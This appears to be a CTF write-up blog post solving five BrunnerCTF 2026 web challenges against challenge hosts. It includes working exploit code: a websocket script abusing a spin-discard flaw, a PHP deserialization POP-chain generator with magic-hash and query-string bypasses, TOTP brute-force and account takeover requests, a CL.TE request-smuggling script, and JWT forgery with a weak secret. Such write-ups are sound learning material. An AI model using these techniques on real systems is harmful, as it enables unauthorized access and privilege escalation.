---
title: "BrunnerCTF 2026 Web Writeup (Selected)"
description: "Notes on solving selected Web challenges from BrunnerCTF 2026."
publishDate: "2026-08-25T00:12:27"
tags:
  - "ctf"
  - "web"
heroImage:
  src: ../../blog/brunnerctf-2026-web-writeup/exploring-the-library.jpg
  color: "#383838"
  alt: BrunnerCTF 2026 Web Writeup (Selected)
language: 'en'
draft: false
---

> I was one challenge short of clearing the Web category — the last one, Technical Debt. I've never touched a large web application like that, and I had no idea where to even start with the code audit, meow... The other challenges were pretty interesting and beginner-friendly, though.

## Fair Gambling

The challenge gives the source. After `docker compose`, it turns out to be a slot-machine gambling site: the starting balance is `1000$`, each spin costs `50$`, and redeeming a prize requires `1_000_000$`. It also gives a `fair proof` saying `SHA1(❓❓❓) = xxx`, which seems to be the `sha1` hash of the spin result — meaning we know what this spin's result will be before spinning. Let me start auditing the challenge source.

Getting the `flag` requires a sufficient balance to redeem a prize.

```typescript
function redeem(ws: ServerWebSocket<{ userid: string }>) {
  const user = getUser(ws.data.userid);
  if (user.flagBought) {
    send(ws, { type: "flag", flag: FLAG, cash: user.cash });
    return;
  }

  if (user.cash < FLAG_COST) {
    send(ws, {
      type: "error",
      message: `Redeem costs $${FLAG_COST.toLocaleString()}.`,
    });
    return;
  }

  user.cash -= FLAG_COST;
  user.flagBought = true;
  send(ws, { type: "flag", flag: FLAG, cash: user.cash });
}
```

First, the slot machine only has `7` kinds of `emoji`, each with its own weight and payout.

```typescript
const symbols: SymbolDef[] = [
  { emoji: "🍒", weight: 500, payout: 50 },
  { emoji: "🍋", weight: 260, payout: 100 },
  { emoji: "🍇", weight: 130, payout: 250 },
  { emoji: "🍉", weight: 60, payout: 1_000 },
  { emoji: "🔔", weight: 20, payout: 5_000 },
  { emoji: "⭐", weight: 5, payout: 20_000 },
  { emoji: "💎", weight: 25, payout: 100_000 },
];
```

A `win` requires all `3` of the drawn `emoji` to be the same.

```typescript
async function prepareSpin(userid: string) {
  const result = [weightedPick(), weightedPick(), weightedPick()];
  const emojis = result.map((symbol) => symbol.emoji);
  const win = emojis.every((emoji) => emoji === emojis[0]) ? result[0].payout : 0;
  const sid = id();

  const spin = { userid, result: emojis, win, hash: await sha1(emojis.join("")) };
  spins.set(sid, spin);
  return { sid, hash: spin.hash } satisfies SpinRef;
}
```

I found that an invalid `sid` lets us discard the next spin's result at no cost and get a new spin result back.

```typescript
function discardPreparedSpins(userid: string) {
  for (const [sid, spin] of spins) {
    if (spin.userid === userid) spins.delete(sid);
  }
}

async function spin(ws: ServerWebSocket<{ userid: string }>, sid?: string) {
  const user = getUser(ws.data.userid);
  const current = sid ? spins.get(sid) : undefined;

  if (!current || current.userid !== ws.data.userid) {
    // An invalid SID deliberately discards a prepared result without charging the user.
    discardPreparedSpins(ws.data.userid);
    send(ws, {
      type: "spin",
      status: "discarded",
      message: "Spin expired. Prepared a replacement.",
      next: await prepareSpin(ws.data.userid),
    });
    return;
  }
```

There's also a win-streak bonus, with the multiplier growing exponentially.

```typescript
const STREAK_MULTIPLIER = 3;

  if (win > 0) {
    user.winStreak++;
    win *= STREAK_MULTIPLIER ** (user.winStreak - 1);
  } else {
    user.winStreak = 0;
  }
```

So the plan is clear: first enumerate all `7*7*7` cases locally and `sha1`-hash them to build a lookup table, then start spinning losslessly — if the next result isn't a win, deliberately pass a wrong `sid` to reset the next result while the balance stays the same, building up a streak, and quickly accumulate enough winnings. I wrote the exploit script, debugged it locally, and then ran it against the challenge container.

**exp.py**

```python
import websocket
import hashlib
import json
import itertools

base = "wss://fair-gambling-bb2b57db09c5370c-global.challs.brunnerne.xyz/ws"

symbols = [
  { "emoji": "🍒", "weight": 500, "payout": 50 },
  { "emoji": "🍋", "weight": 260, "payout": 100 },
  { "emoji": "🍇", "weight": 130, "payout": 250 },
  { "emoji": "🍉", "weight": 60, "payout": 1_000 },
  { "emoji": "🔔", "weight": 20, "payout": 5_000 },
  { "emoji": "⭐", "weight": 5, "payout": 20_000 },
  { "emoji": "💎", "weight": 25, "payout": 100_000 },
]

def sha1(s):
    return hashlib.sha1(s.encode("utf-8")).hexdigest()

def win_table():
    emojis = [s["emoji"] for s in symbols]	#列表推导式
    payouts = {s["emoji"]: s["payout"] for s in symbols}	#字典推导式

    table = {}

    for combo in itertools.product(emojis, repeat=3):	#枚举的奇妙写法，py 版笛卡尔积(离散数学喵
        text = "".join(combo)
        h = sha1(text)

        is_win = combo[0] == combo[1] == combo[2]	# py 的链式比较
        payout = payouts[combo[0]] if is_win else 0

        table[h] = {	#嵌套字典
            "combo": combo,
            "is_win": is_win,
            "payout": payout,
        }

    return table

def main():
    table = win_table()
    ws = websocket.create_connection(base)

    cash = 1000
    flag_cost = 1000000

    while True:
        data = json.loads(ws.recv())

        if data["type"] == "state":
            cash = data["cash"]
            flag_cost = data["flagCost"]
            next_spin = data["next"]

        elif data["type"] == "spin":
            if data["status"] == "revealed":
                cash = data["cash"]
                if cash >= flag_cost:
                    ws.send(json.dumps({"type":"redeem"}))
                    continue
                next_spin = data["next"]
            elif data["status"] == "discarded":
                next_spin = data["next"]

        elif data["type"] == "flag":
            print("Flag:",data["flag"])
            break

        sid = next_spin["sid"]
        h = next_spin["hash"]
        result = table[h]

        if result["is_win"]:
            print(result["combo"])
            ws.send(json.dumps({"type":"spin","sid":sid}))
        else:
            print("discard")
            ws.send(json.dumps({"type":"spin","sid":"fake"}))

    ws.close()


if __name__ == "__main__":
    main()
```

```text
(venv) resi@MacBook-Air 脚本 % /Users/resi/Desktop/CTF/脚本/venv/bin/python /Users/resi/Desktop/CTF/脚本/exp.py
discard
('🍋', '🍋', '🍋')
discard
discard
discard
discard
discard
discard
('🍒', '🍒', '🍒')
discard
discard
discard
discard
discard
('🍒', '🍒', '🍒')
('🍒', '🍒', '🍒')
discard
discard
discard
discard
('🍒', '🍒', '🍒')
discard
('🍒', '🍒', '🍒')
('🍒', '🍒', '🍒')
('🍋', '🍋', '🍋')
discard
discard
discard
discard
discard
discard
discard
('🍋', '🍋', '🍋')
discard
discard
discard
discard
('🍒', '🍒', '🍒')
Flag: brunner{l3ts_g0_g4mbl1ng}
```

### Flag

```text
brunner{l3ts_g0_g4mbl1ng}
```

## PHP 2003

`dirsearch` turns up some directories.

```text
[17:29:42] Scanning: 
[17:31:16] 200 -    1KB - /index.php                                        
[17:31:16] 200 -    1KB - /index.php/login/                                 
[17:31:48] 200 -   114B - /robots.txt                                       
[17:31:50] 403 -   358B - /server-status                                    
[17:31:50] 403 -   358B - /server-status/
```

Among them, `/robots.txt` leaks some routes.

```text
User-agent: *
Disallow: /cgi-bin/
Disallow: /stats/
Disallow: /webmail/
Disallow: /private/
Disallow: /index.phps
```

The others all return `404`, but `/index.phps` reveals the source:

```php
<?php
declare(strict_types=1);

const ACCESS_CODE_HASH = '0e769468064680399918991535722650';

final class Voucher
{
    public function __toString(): string
    {
        return getenv('WEBHOTEL_LICENSE_KEY') ?: 'brunner{REDACTED}';
    }
}

final class Receipt
{
    public bool $flushOnShutdown = false;
    public mixed $voucher = null;

    public function __destruct()
    {
        if ($this->flushOnShutdown && $this->voucher instanceof Voucher) {
            $flag = htmlspecialchars((string) $this->voucher, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            echo '<div class="result flag">' . $flag . '</div>';
        }
    }
}

final class Booking
{
    public string $user = '';
    public string $role = 'guest';
    public mixed $receipt = null;
}

function legacy_cgi_request(): bool
{
    $raw = $_SERVER['QUERY_STRING'] ?? '';
    $decoded = urldecode($raw);

    if (str_contains($decoded, '-')) {
        return false;
    }

    $normalized = str_replace("\u{00AD}", '-', $decoded);
    return trim($normalized) === '-d webhotel.legacy=1';
}

function first_serialized_string(string $serialized, string $property): ?string
{
    $name = preg_quote($property, '/');
    $pattern = '/s:' . strlen($property) . ':"' . $name . '";s:(\d+):"(.*?)";/s';

    if (!preg_match($pattern, $serialized, $match)) {
        return null;
    }

    return strlen($match[2]) === (int) $match[1] ? $match[2] : null;
}

$message = '';
$messageClass = 'error';
$destroyBooking = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $staffPin = (string) ($_POST['staff_pin'] ?? '');
    $encodedReservation = (string) ($_POST['reservation_export'] ?? '');
    $reservation = base64_decode($encodedReservation, true);

    if (!legacy_cgi_request()) {
        $message = 'The reservation service is unavailable.';
    } elseif (md5($staffPin) != ACCESS_CODE_HASH) {
        $message = 'Recovery code rejected.';
    } elseif ($reservation === false) {
        $message = 'Reservation export rejected.';
    } elseif (first_serialized_string($reservation, 'role') !== 'guest') {
        $message = 'Only customer reservations can be imported.';
    } else {
        $booking = @unserialize($reservation, [
            'allowed_classes' => [Booking::class, Receipt::class, Voucher::class],
        ]);

        if (!$booking instanceof Booking) {
            $message = 'Reservation export could not be read.';
        } elseif ($booking->role !== 'admin') {
            $message = 'A staff reservation is required.';
        } elseif (!$booking->receipt instanceof Receipt) {
            $message = 'Receipt missing from reservation export.';
        } else {
            $booking->receipt->flushOnShutdown = true;
            $destroyBooking = $booking;
            $message = 'Reservation imported.';
            $messageClass = 'ok';
        }
    }
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Brunnerne Hosting · Customer Area</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<table class="shell" role="presentation">
    <tr><td class="titlebar">BRUNNERNE HOSTING</td></tr>
    <tr><td class="nav">Home  |  Customers  |  Webmail  |  Support</td></tr>
    <tr><td class="content">
        <div class="panel">
            <div class="panel-title">Reservation import</div>
            <p class="intro">The original booking system is no longer in service. Staff can restore a customer reservation from an exported booking file.</p>
            <form method="post">
                <label>Staff recovery code</label>
                <input name="staff_pin" autocomplete="off">

                <label>Reservation export</label>
                <textarea name="reservation_export" rows="7" spellcheck="false"></textarea>

                <button type="submit">Import reservation</button>
            </form>
            <?php if ($message !== ''): ?>
                <div class="result <?= $messageClass ?>"><?= htmlspecialchars($message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?></div>
            <?php endif; ?>
            <?php
            if ($destroyBooking !== null) {
                unset($destroyBooking);
                unset($booking);
            }
            ?>
        </div>
    </td></tr>
    <tr><td class="footer">Brunnerne Hosting ApS · Customer services · Portal build 2003.11</td></tr>
</table>
</body>
</html>
```

Clearly it's `php` deserialization, so let me start analyzing and constructing the `POP` chain.

```php
final class Voucher
{
    public function __toString(): string
    {
        return getenv('WEBHOTEL_LICENSE_KEY') ?: 'brunner{REDACTED}';
    }
}
```

The endpoint is `Voucher`'s `__toString()`.

```php
final class Receipt
{
    public bool $flushOnShutdown = false;
    public mixed $voucher = null;

    public function __destruct()
    {
        if ($this->flushOnShutdown && $this->voucher instanceof Voucher) {
            $flag = htmlspecialchars((string) $this->voucher, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
            echo '<div class="result flag">' . $flag . '</div>';
        }
    }
}
```

So here we need to control `$this->voucher` to be a `Voucher` object and set `$this->flushOnShutdown` to `true`. Since `$flushOnShutdown` here is `public`, we can write it directly in the serialized string, and triggering its destructor requires a `Receipt` object.

Let me look at the web page's logic.

We need to send a `POST` `http` request, passing in `staff_pin` and `reservation_export`.

Step one is bypassing `!legacy_cgi_request()`, which requires the `url` parameter to end up being `-d webhotel.legacy=1`; but including `-` sets it to `false`. However, there's a `str_replace("\u{00AD}", '-', $decoded)` later, so in `CyberChef` you do `Unicode` decode, then `UTF-8` encode, then `URL` encode, converting `?\u00ADd webhotel.legacy=1` into `?%C2%ADd%20webhotel%2Elegacy=1` to bypass it.

```php
function legacy_cgi_request(): bool
{
    $raw = $_SERVER['QUERY_STRING'] ?? '';
    $decoded = urldecode($raw);

    if (str_contains($decoded, '-')) {
        return false;
    }

    $normalized = str_replace("\u{00AD}", '-', $decoded);
    return trim($normalized) === '-d webhotel.legacy=1';
}
```

Step two is bypassing `md5($staffPin) != ACCESS_CODE_HASH`. This is a loose comparison, so the known `md5(QNKCDZO)=0e830400451993494058024219903391` bypasses it.

Step three is making sure `reservation_export` is a valid `base64` string.

Step four is bypassing the initial match `first_serialized_string($reservation, 'role') !== 'guest'`. The `first_serialized_string` function does a regex match and only captures and returns the value of the first `role` it finds, so we just need to make the first `role` it can find be `guest`.

```php
function first_serialized_string(string $serialized, string $property): ?string
{
    $name = preg_quote($property, '/');
    $pattern = '/s:' . strlen($property) . ':"' . $name . '";s:(\d+):"(.*?)";/s';

    if (!preg_match($pattern, $serialized, $match)) {
        return null;
    }

    return strlen($match[2]) === (int) $match[1] ? $match[2] : null;
}
```

Step five enters deserialization, and everything after that we don't need to worry about.

**exp.php**

```php
<?php

final class Voucher
{
}

final class Receipt
{
    public bool $flushOnShutdown;
    public mixed $voucher;
}

final class Booking
{
    public string $user;
    public string $role;
    public mixed $receipt;
}

$booking = new Booking();
$booking -> user = "";
$booking -> role = "guest";
$receipt = new Receipt();
$receipt -> flushOnShutdown = true;
$voucher = new Voucher();
$receipt -> voucher = $voucher;
$booking -> receipt = $receipt;

$payload=serialize($booking);
print($payload);
print("\n");
print(base64_encode($payload));
print("\n");
```

Successfully got the final `flag`.

![PHP 2003, figure 1](../../blog/brunnerctf-2026-web-writeup/images/image-20260824175006775.png)

### Flag

```text
brunner{php_was_a_web_framework_and_a_fever_dream}
```

## Dumb-factor Authentication

```text
User-agent: *
Disallow: /feedback/view?id=
```

`robots.txt` leaks a route, but accessing `/feedback/view?id=` directly gives no permission.

```text
In the interest of peak operational efficiency, I have completely deleted the legacy username and password fields. Who needs them? From now on, the portal runs exclusively on raw TOTP PINs!
```

The page's description hints that login uses a `TOTP authenticator` rather than a `username + password`.

```text
We are also thrilled to announce that the Brunnerne HR platform has officially crossed the 1,000 registered users milestone.
```

And there are a lot of users, so let me just start brute-forcing the `pin`.

I successfully guessed a `session`:

```text
session=MTc4NzQ4MzI1NXxEWDhFQVFMX2dBQUJFQUVRQUFCTl80QUFBZ1p6ZEhKcGJtY01DUUFIZFhObGNsOXBaQU5wYm5RRUJBRC1BXzRHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dSQUE5d2NtOTRlVjloWkcxcGJsODFNRGs9fJwTzo9zgzp8MZBR1De9KjNNBJWY-qQVgP6BekMPjdQj
```

After logging in, I see two more pieces of information on the page.

```text
Emergency Security Incident: Keycard Replacements Required
Attention all personnel: Due to a major physical security incident yesterday involving Kjell and a military-grade degausser (which successfully erased all magnetic strips, keycard credentials, and employee credit cards in a 50-foot radius), your current physical badges are completely non-functional. Please report to the temporary security tent in the parking lot to collect a newly issued keycard. Thank you for your patience!
Facilities Team • May 29, 2026

Security Advisory: Choosing Unique Usernames
Following the launch of our simplified passwordless single-factor TOTP login system, we have noticed some minor login issues due to username collisions. Please make sure your username on the settings dashboard is completely unique.
Security Operations • May 28, 2026
```

This shows that we can replace our `keycard` and that the backend allows duplicate usernames, so we can rename ourselves to `admin`.

So here the idea is probably to rename ourselves to `admin`, then swap the `keycard` and log in to properly gain `admin` privileges.

Rename to `admin`:

```http
POST /settings HTTP/2
Host: dumb-factor-authentication-d6b2edefc3e4a2db-global.challs.brunnerne.xyz
Cookie: session=MTc4NzQ4MzI1NXxEWDhFQVFMX2dBQUJFQUVRQUFCTl80QUFBZ1p6ZEhKcGJtY01DUUFIZFhObGNsOXBaQU5wYm5RRUJBRC1BXzRHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dSQUE5d2NtOTRlVjloWkcxcGJsODFNRGs9fJwTzo9zgzp8MZBR1De9KjNNBJWY-qQVgP6BekMPjdQj
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://dumb-factor-authentication-d6b2edefc3e4a2db-global.challs.brunnerne.xyz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://dumb-factor-authentication-d6b2edefc3e4a2db-global.challs.brunnerne.xyz/settings
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i

action=update_username&username=admin
```

```http
HTTP/2 302 Found
Date: Sun, 23 Aug 2026 11:14:12 GMT
Location: /settings
Set-Cookie: session=MTc4NzQ4MzY1MnxEWDhFQVFMX2dBQUJFQUVRQUFCRF80QUFBZ1p6ZEhKcGJtY01DUUFIZFhObGNsOXBaQU5wYm5RRUJBRC1BXzRHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dIQUFWaFpHMXBiZz09fOpdyf_h6ORopT44XJm1_EcNfwn4vcS5UB09KI9wV4D_; Path=/; Expires=Tue, 22 Sep 2026 11:14:12 GMT; Max-Age=2592000; HttpOnly; SameSite=Lax
X-Deployment-Id: dumb-factor-authentication-d6b2edefc3e4a2db-global
X-Team-Id: 819
X-Terminal-Id: global
Content-Length: 0
```

Take the renamed `session` and reset the `key`:

```http
POST /settings HTTP/2
Host: dumb-factor-authentication-d6b2edefc3e4a2db-global.challs.brunnerne.xyz
Cookie: session=MTc4NzQ4MzY1MnxEWDhFQVFMX2dBQUJFQUVRQUFCRF80QUFBZ1p6ZEhKcGJtY01DUUFIZFhObGNsOXBaQU5wYm5RRUJBRC1BXzRHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dIQUFWaFpHMXBiZz09fOpdyf_h6ORopT44XJm1_EcNfwn4vcS5UB09KI9wV4D_
Content-Length: 17
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: https://dumb-factor-authentication-d6b2edefc3e4a2db-global.challs.brunnerne.xyz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://dumb-factor-authentication-d6b2edefc3e4a2db-global.challs.brunnerne.xyz/settings
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Priority: u=0, i

action=reset_totp
```

It returned a QR code:

```text
https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=otpauth://totp/BrunnerneHR:admin?secret=IV6LKLKMFWT3Q2OY%26issuer=BrunnerneHR
```

I got `secret=IV6LKLKMFWT3Q2OY` and generated the `TOTP code` directly with a script:

```python
import pyotp

secret = "IV6LKLKMFWT3Q2OY"
totp = pyotp.TOTP(secret)
print(totp.now())
```

I got the code and logged in properly as `admin`, then took the `session` and brute-forced the `/feedback/view?id=` route, finding the `flag` at `id=24`.

![Dumb-factor Authentication, figure 1](../../blog/brunnerctf-2026-web-writeup/images/image-20260823190204269.png)

### Flag

```text
brunner{ch1ef_duck_0ff1c3r_4ppr0v3d_th1s_fl4g}
```

## Welcome Aboard

`/robots.txt` leaks `/wiki/internal/flag`.

```text
User-agent: *
Disallow: /wiki/internal/flag
```

But accessing it directly is forbidden.

```text
Access is forbidden.
```

Combined with the challenge description `and IT is confident every chunk reaches the backend, exactly as expected.`, I guessed it should be `CLTE` smuggling.

**exp.py**

```python
import socket
import ssl

HOST = "welcome-aboard-ea9173461961a63c-global.challs.brunnerne.xyz"
PORT = 1337
TIMEOUT = 10

# 第二个请求(走私)
smuggled = (
    b"0\r\n\r\n"
    b"GET /wiki/internal/flag/ HTTP/1.1\r\n"
    b"Host: welcome-aboard-ea9173461961a63c-global.challs.brunnerne.xyz:1337" + b"\r\n"
    b"Connection: close\r\n\r\n"
)

# 第一个请求
payload = (
    b"GET / HTTP/1.1\r\n"
    b"Host: welcome-aboard-ea9173461961a63c-global.challs.brunnerne.xyz:1337" + b"\r\n"
    + f"Content-Length: {len(smuggled)}\r\n".encode()
    + b"Transfer-Encoding: chunked\r\n"
    + b"Connection: keep-alive\r\n\r\n"
    + smuggled
)

print(f"Content-Length = {len(smuggled)}")
print(f"总发送字节数 = {len(payload)}\n")

raw = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
context = ssl.create_default_context()
s = context.wrap_socket(raw, server_hostname=HOST)
s.settimeout(TIMEOUT)
s.sendall(payload)

resp = b""

try:
    while True:
        data = s.recv(4096)
        if not data:
            break
        resp += data
except socket.timeout:
    print("超时")

print(resp.decode("utf-8", errors="replace"))
s.close()
```

Successfully captured the `flag`:

```text
(venv) resi@MacBook-Air 脚本 % /Users/resi/Desktop/CTF/脚本/venv/bin/python /Users/resi/Desktop/CTF/脚本/smuggle.py
Content-Length = 133
总发送字节数 = 296

HTTP/1.1 200 OK
Content-Length: 3756
Content-Type: text/html
Date: Sun, 23 Aug 2026 10:24:37 GMT
Server: Kestrel

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Brunnerne Inc. Wiki | Brunnerne Inc. Wiki</title>
<style>
:root{color-scheme:light}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#f2f1f7;color:#2c2c3a}
a{color:#6a4fe0}
header{background:linear-gradient(180deg,#6f4fe0,#5b3fd6)}
.header-top{max-width:1100px;margin:0 auto;padding:22px 32px 0;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.brand{color:#fff;font-weight:700;font-size:22px;letter-spacing:.01em;text-decoration:none}
.header-top nav{display:flex;align-items:center}
.header-top nav a{color:#e2dbfb;text-decoration:none;margin-left:26px;font-size:14px}
.header-top nav a:hover{color:#fff}
.header-top nav a.active{color:#fff;font-weight:600}
.contact-btn{border:1px solid rgba(255,255,255,.55)!important;padding:8px 18px;border-radius:6px}
.search-wrap{max-width:1100px;margin:0 auto;padding:22px 32px 40px}
.search-hero{background:rgba(255,255,255,.16);border-radius:10px;padding:16px 20px;display:flex;align-items:center;gap:12px}
.search-hero svg{flex:none;opacity:.85}
.search-hero input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-size:16px}
.search-hero input::placeholder{color:#d9d2f7}
.breadcrumb{max-width:820px;margin:28px auto 0;padding:0 24px;font-size:13px;color:#9797a6}
.card{max-width:820px;margin:14px auto 60px;background:#fff;border-radius:12px;padding:44px 48px;box-shadow:0 1px 3px rgba(20,20,40,.06)}
h1{margin:0 0 22px;font-size:28px;font-weight:700;color:#1c1c2b;line-height:1.3}
.byline{display:flex;align-items:center;gap:10px;color:#9797a6;font-size:13px;margin-bottom:28px}
.byline .avatar{width:34px;height:34px;border-radius:50%;background:#e4e0f8;color:#6a4fe0;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px}
.card p{color:#54546a;line-height:1.75;font-size:15px}
.article-list{list-style:none;padding:0;margin:0}
.article-list li{margin:0 0 10px}
.article-list a{display:block;padding:14px 18px;background:#faf9fd;border:1px solid #ece9f7;border-radius:8px;color:#2c2c3a;text-decoration:none;font-weight:600}
.article-list a:hover{border-color:#c9bdf5;background:#f5f2fd}
.back-link{display:inline-block;margin-top:8px;font-size:14px;text-decoration:none}
footer{font-size:12px;color:#9797a6;text-align:center;padding:24px}
</style>
</head>
<body>
<header>
<div class="header-top">
<a class="brand" href="/">Brunnerne Inc.</a>
</div>
<div class="search-wrap">
<form class="search-hero" method="post" action="/search">
<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
<input type="text" name="q" placeholder="Search for answers...…">
</form>
</div>
</header>
<div class="breadcrumb">Help Center</div>
<main class="card">
<h1>Welcome to the wiki</h1>
<p>This is the company's internal FAQ and knowledge base. Browse the articles below, or use
the search bar above to find what you're looking for.</p>
<ul class="article-list">
<li><a href="/wiki/getting-started">Getting Started at Brunnerne Inc.</a></li>
<li><a href="/wiki/vpn-setup">VPN Setup Guide</a></li>
<li><a href="/wiki/expense-reports">Filing Expense Reports</a></li>
<li><a href="/wiki/pto-policy">Time Off Policy</a></li>
<li><a href="/wiki/office-locations">Office Locations</a></li>
<li><a href="/wiki/it-support">Contacting IT Support</a></li>
</ul>
<a class="back-link" href="/">← Back to wiki</a>
</main>
<footer>Brunnerne Inc. internal knowledge base</footer>
</body>
</html>HTTP/1.1 200 OK
Content-Length: 3453
Connection: close
Content-Type: text/html
Date: Sun, 23 Aug 2026 10:24:37 GMT
Server: Kestrel

<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Q4 Payroll Notes (Internal) | Brunnerne Inc. Wiki</title>
<style>
:root{color-scheme:light}
*{box-sizing:border-box}
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;background:#f2f1f7;color:#2c2c3a}
a{color:#6a4fe0}
header{background:linear-gradient(180deg,#6f4fe0,#5b3fd6)}
.header-top{max-width:1100px;margin:0 auto;padding:22px 32px 0;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px}
.brand{color:#fff;font-weight:700;font-size:22px;letter-spacing:.01em;text-decoration:none}
.header-top nav{display:flex;align-items:center}
.header-top nav a{color:#e2dbfb;text-decoration:none;margin-left:26px;font-size:14px}
.header-top nav a:hover{color:#fff}
.header-top nav a.active{color:#fff;font-weight:600}
.contact-btn{border:1px solid rgba(255,255,255,.55)!important;padding:8px 18px;border-radius:6px}
.search-wrap{max-width:1100px;margin:0 auto;padding:22px 32px 40px}
.search-hero{background:rgba(255,255,255,.16);border-radius:10px;padding:16px 20px;display:flex;align-items:center;gap:12px}
.search-hero svg{flex:none;opacity:.85}
.search-hero input{flex:1;background:transparent;border:none;outline:none;color:#fff;font-size:16px}
.search-hero input::placeholder{color:#d9d2f7}
.breadcrumb{max-width:820px;margin:28px auto 0;padding:0 24px;font-size:13px;color:#9797a6}
.card{max-width:820px;margin:14px auto 60px;background:#fff;border-radius:12px;padding:44px 48px;box-shadow:0 1px 3px rgba(20,20,40,.06)}
h1{margin:0 0 22px;font-size:28px;font-weight:700;color:#1c1c2b;line-height:1.3}
.byline{display:flex;align-items:center;gap:10px;color:#9797a6;font-size:13px;margin-bottom:28px}
.byline .avatar{width:34px;height:34px;border-radius:50%;background:#e4e0f8;color:#6a4fe0;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:13px}
.card p{color:#54546a;line-height:1.75;font-size:15px}
.article-list{list-style:none;padding:0;margin:0}
.article-list li{margin:0 0 10px}
.article-list a{display:block;padding:14px 18px;background:#faf9fd;border:1px solid #ece9f7;border-radius:8px;color:#2c2c3a;text-decoration:none;font-weight:600}
.article-list a:hover{border-color:#c9bdf5;background:#f5f2fd}
.back-link{display:inline-block;margin-top:8px;font-size:14px;text-decoration:none}
footer{font-size:12px;color:#9797a6;text-align:center;padding:24px}
</style>
</head>
<body>
<header>
<div class="header-top">
<a class="brand" href="/">Brunnerne Inc.</a>
</div>
<div class="search-wrap">
<form class="search-hero" method="post" action="/search">
<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="11" cy="11" r="7"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
<input type="text" name="q" placeholder="Search for answers...…">
</form>
</div>
</header>
<div class="breadcrumb">Help Center / Q4 Payroll Notes (Internal)</div>
<main class="card">
<h1>Q4 Payroll Notes (Internal)</h1>
<div class="byline"><span class="avatar">HR</span><span>Written by HR</span></div>
<p>These notes are for the payroll team only and are not linked from the public wiki. Flag: brunner{00ps_th4t_p4g3_w4s_1nt3rn4l}</p>
<a class="back-link" href="/">← Back to wiki</a>
</main>
<footer>Brunnerne Inc. internal knowledge base</footer>
</body>
</html>
```

### Flag

```text
brunner{00ps_th4t_p4g3_w4s_1nt3rn4l}
```

## Secret Event

The `jwt` uses a weak `secret`, which I brute-forced directly to get `secret="secret"`.

Forge a `jwt` with `role` set to `admin`, change the `Cookie` in `devtools`, and access `/admin` to see the `flag`.

![Secret Event, figure 1](../../blog/brunnerctf-2026-web-writeup/images/image-20260823202530907-1.png)

### Flag

```text
brunner{well_known_secret}
```
